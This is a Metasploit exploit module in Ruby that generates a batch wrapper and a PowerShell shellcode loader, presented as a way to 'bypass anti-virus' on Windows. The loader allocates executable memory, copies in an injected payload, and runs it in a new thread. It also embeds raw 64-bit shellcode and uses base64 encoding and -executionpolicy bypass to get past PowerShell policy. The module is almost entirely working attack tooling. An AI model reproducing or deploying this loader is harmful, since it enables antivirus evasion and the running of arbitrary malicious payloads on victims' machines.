require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::FILEFORMAT
	include Msf::Exploit::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Windows Powershell shellcode run bypass anti-virus',
			'Description'    => %q{
			Windows Powershell shellcode run bypass anti-virus
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Matthew Graeber', # Original Exploit
					'hellok', # MSF Module
				],
			'DefaultOptions'  =>
				{
					'ExitFunction' => 'process',
					'InitialAutoRunScript' => 'migrate -f',
				},
			'Platform'       => 'win',
			'Payload'        =>
				{
				   #'Space'           => 200,
				   #'BadChars'        => "\x00\x0a\x0d\x1a\x80",
				   #'DisableNops'     => true,
				   #'StackAdjustment' => -3500,
				},
			'References'     =>
                [
                    [ 'URL', 'http://carnal0wnage.attackresearch.com/2012/05/powershell-shellcode-metasploit-x64.html' ],
					[ 'URL', 'http://www.obscuresecurity.blogspot.com/2011/08/powershell-executionpolicy.html'],
                    [ 'URL', 'http://dev.metasploit.com/documents/api/']
                ],	
			'Targets'        =>
				[
					[ 'Windows 7',
						{
						}
					],
				],
			'Privileged'     => false,
			'DisclosureDate' => '',
			'DefaultTarget'  => 0))
	end

	def exploit

		file1 = <<-BYPASSBAT
@echo off
REM: Bypass.bat
REM: cmd /C bypass.bat 1.ps1
powershell.exe -noprofile -Command "powershell.exe -noprofile -encodedCommand ([Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes((gc %1 |%%{$_}|out-string))))"
pause
		BYPASSBAT
		
		path1 = ::File.join( Msf::Config.install_root, "data", "exploits","bypass.bat" )
		aFile = File.new(path1, "w+")
		if aFile
		aFile.syswrite(file1)
		print_status("create #{path1} OK")
		else
		print_status("create #{path1} failed")
		end
		
		file2_part1=<<-powershell_ps1
<#
Powershell Code Execution 'Exploit'
Author: Matthew Graeber
Disclaimer: This code is provided for academic purposes only and should not be used for evil. You are liable for your own actions.
#>

# Import required functions
$code = @"
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);
"@

# Add CSharp code as a class recognized by Powershell
$winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru

# Copy and paste your shellcode here in the form 0xXX.
# 32-bit payload
[Byte[]]$sc32 = 
powershell_ps1


		payload_buf = ''
		payload_buf << payload.encoded
		hex_payload = Rex::Text.to_hex(payload_buf, prefix = ",0x", count = 1)
		#print_status(hex_payload)
		shellcode=hex_payload[1,hex_payload.length]
		print_status(shellcode)

		file2_part2=<<-powershell_ps2
		
# 64-bit payload
# msfpayload windows/x64/exec CMD="cmd /k calc" EXITFUNC=thread
[Byte[]]$sc64 = 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x6d,0x64,0x20,0x2f,0x6b,0x20,0x63,0x61,0x6c,0x63,0x00

# Determine if Powershell is running as 32 or 64 bit
#[Byte[]]$sc = $sc32
#if ([IntPtr]::Size -eq 8) {$sc = $sc64}
[Byte[]]$sc = $sc32
if ($env:Processor_Architecture -ne "x86")
 {
  write-warning "WTF!  This is 64x, switching to 32x and continuing script."
   &"$env:windir\syswow64\windowspowershell\v1.0\powershell.exe" -noprofile -file $myinvocation.Mycommand.path -executionpolicy bypass
 exit
} 


# Calculate correct size param for VirtualAlloc
$size = 0x1000
if ($sc.Length -gt 0x1000) {$size = $sc.Length}

# Allocate a page of memory. This will only work if the size parameter (3rd param) is at least 0x1000.
# Allocate RWX memory block
$x=$winFunc::VirtualAlloc(0,0x1000,$size,0x40)

# I could have more easily used memcpy but that would have required the use of a particular .NET class to cast $sc as an IntPtr. I wanted to get this working without needing additional .NET classes. I prefer to KISS (keep it simple, stupid).
for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)}

# Execute you payload
$winFunc::CreateThread(0,0,$x,0,0,0)
		powershell_ps2
		
		path2 = ::File.join( Msf::Config.install_root, "data", "exploits","1.ps1" )
		aFile = File.new(path2, "w+")
		if aFile
		aFile.syswrite(file2_part1)
		aFile.syswrite(shellcode)
		aFile.syswrite(file2_part2)
		print_status("create #{path2} OK")
		else
		print_status("create #{path2} failed")
		end
		
		print_status("usage: bypass.bat 1.ps1\nexample:\ncd C:\\Program Files\\Rapid7\\framework\\msf3\\data\\exploits\nbypass.bat 1.ps1")
		
		handler
		
	end
end
